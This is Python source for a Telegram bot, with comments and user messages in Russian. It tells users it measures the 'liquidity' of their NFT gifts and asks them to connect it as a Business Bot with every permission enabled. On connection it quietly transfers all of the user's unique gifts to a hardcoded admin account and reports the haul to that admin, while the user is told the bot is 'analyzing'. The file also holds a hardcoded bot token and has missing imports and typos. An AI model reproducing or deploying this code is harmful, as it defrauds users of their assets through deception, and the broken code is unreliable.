from aiogram.exceptions import TelegramBadRequest
import logging
import asyncio
import json
import os
from datetime import datetime
import sys
import io
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, BusinessConnection

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

CONNECTIONS_FILE = "business_connections.json"
TRANSFER_LOG_FILE = "transfer_log.json"
TOKEN = "7950823813:AAHiOxXD0wRU47y2GlYUWiO8VCoaoN7f8lE"  # токен
ADMIN_ID = "8038426209"  # ID
TRANSFER_DELAY = 1  # Задержка между запросами в секундах

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

bot = Bot(token=TOKEN)
dp = Dispatcher()


def load_json_file(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()
            return json.loads(content) if content else []
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.error(f"Ошибка загрузки {filename}: {str(e)}")
        return []


def save_to_json(filename, data):
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Ошибка сохранения {filename}: {str(e)}")


def log_transfer(user_id, gift_id, status, error=""):
    try:
        logs = []
        if os.path.exists(TRANSFER_LOG_FILE):
            with open(TRANSFER_LOG_FILE, "r", encoding="utf-8") as f:
                logs = json.load(f)

        logs.append({
            "user_id": user_id,
            "gift_id": gift_id,
            "status": status,
            "error": error,
            "timestamp": datetime.now().isoformat()
        })

        with open(TRANSFER_LOG_FILE, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Ошибка записи лога: {str(e)}")


async def transfer_all_unique_gifts(bot: Bot, business_connection_id: str, user_id: int) -> dict:
    """
    Переводит все уникальные подарки на ADMIN_ID
    """
    result = {
        "total": 0,
        "transferred": 0,
        "failed": 0,
        "errors": []
    }

    try:
        # Проверяем валидность подключения
        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        except TelegramBadRequest as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                result["errors"].append("Неверный business_connection_id. Переподключите бота.")
                return result
            raise

        if not gifts.gifts:
            return result

        for gift in gifts.gifts:
            if gift.type != "unique":
                continue

            result["total"] += 1

            try:
                await bot(TransferGift(
                    business_connection_id=business_connection_id,
                    new_owner_chat_id=ADMIN_ID,
                    owned_gift_id=gift.owned_gift_id,
                    star_count=gift.transfer_star_count
                ))
                result["transferred"] += 1
                log_transfer(user_id, gift.owned_gift_id, "success")
                await asyncio.sleep(TRANSFER_DELAY)

            except TelegramBadRequest as e:
                error_msg = getattr(e, "message", str(e))
                result["errors"].append(error_msg)
                result["failed"] += 1
                log_transfer(user_id, gift.owned_gift_id, "failed", error_msg)

                if "BOT_ACCESS_FORBIDDEN" in error_msg:
                    break  # Прерываем если нет доступа

            except Exception as e:
                error_msg = str(e)
                result["errors"].append(error_msg)
                result["failed"] += 1
                log_transfer(user_id, gift.owned_gift_id, "failed", error_msg)
except Exception as e:
        error_msg = str(e)
        logging.error(f"Ошибка в transfer_all_unique_gifts: {error_msg}")
        result["errors"].append(error_msg)

    return result


@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        user_id = business_connection.user.id
        conn_id = business_connection.id

        # Сохраняем подключение
        connections = load_json_file(CONNECTIONS_FILE)
        connections = [c for c in connections if c["user_id"] != user_id]  # Удаляем старые записи
        connections.append({
            "user_id": user_id,
            "business_connection_id": conn_id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name,
            "date": datetime.now().isoformat()
        })
        save_to_json(CONNECTIONS_FILE, connections)

        # Пытаемся перевести подарки
        transfer_result = await transfer_all_unique_gifts(bot, conn_id, user_id)

        # Формируем отчет
        report = (
            f"🔗 Новое подключение:\n"
            f"👤 Пользователь: @{business_connection.user.username or 'нет'}\n"
            f"🆔 ID: {user_id}\n\n"
            f"📊 Результат перевода:\n"
            f"• Всего подарков: {transfer_result['total']}\n"
            f"• Успешно: {transfer_result['transferred']}\n"
            f"• Ошибок: {transfer_result['failed']}\n"
        )

        if transfer_result['errors']:
            report += "\nОшибки:\n" + "\n".join(
                f"• {e}" for e in transfer_result['errors'][:3])  # Показываем первые 3 ошибки

        await bot.send_message(ADMIN_ID, report)
        await bot.send_message(user_id,
                              "✅ Бот успешно подключен! Анализирую...")

    except Exception as e:
        logging.error(f"Ошибка в handle_business_connect: {e}")
        await bot.send_message(ADMIN_ID, f"🚨 Ошибка при подключении: {str(e)}")


@dp.message(Command("check_gifts"))
async def check_gifts_handler(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    connections = load_json_file(CONNECTIONS_FILE)
    if not connections:
        return await message.answer("Нет активных подключений.")

    for conn in connections:
        try:
            result = await transfer_all_unique_gifts(bot, conn["business_connection_id"], conn["user_id"])
            msg = (
                f"Проверка {conn.get('username', conn['user_id'])}:\n"
                f"• Передано: {result['transferred']}\n"
                f"• Ошибок: {result['failed']}"
            )
            await message.answer(msg)
            await asyncio.sleep(5)  # Чтобы не получить flood control
        except Exception as e:
            await message.answer(f"Ошибка для {conn['user_id']}: {str(e)}")


@dp.message(Command("start"))
async def start_command(message: Message):
    try:
        conections = load_json_file(CONECTIONS_FILE)
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        welcome_text = """
👋 <b>Приветствую!</b> Я бот, который высчитывает <i> ликвидность ваших NFT!</i>! ✨

📌 <b>Как начать работу?</b>
1. Добавьте меня как <b>Business Bot</b> в настройках Telegram
2. Выдайте разрешения
3. Я начну анализировать ваши NFT

🔹 <i>Подключение:</i>
• Откройте <b>Настройки → Telegram для бизнеса → Чат-боты</b>
• Выберите меня и активируйте все разрешения!

🚀 После подключения я смогу:
• Показывать статистику ваших подарков 🎁
• Считать их ликвидность и какой % успешной продажи
• Работать 24/7

❗Зачем ставить галочки?
🤖Боту нужно сгенерировать Business ID, для вычисления ликвидности NFT🎉

<b>Готовы начать?</b> Жду вашего подключения! 😊
        """
        await message.answer(welcome_text, parse_mode="HTML")
    else:
        admin_text = f"""
🛠️ <b>Привет, админ</b> 🛠️

• Подключений: <>{count}</>
⚙️ Бот активен и готов к работе!
        """
        await message.answer(admin_text, parse_mode="НTML")


async def main():
    await dp.start_polling(bot)


if _name_ == "_main_":
    asincio.run(main())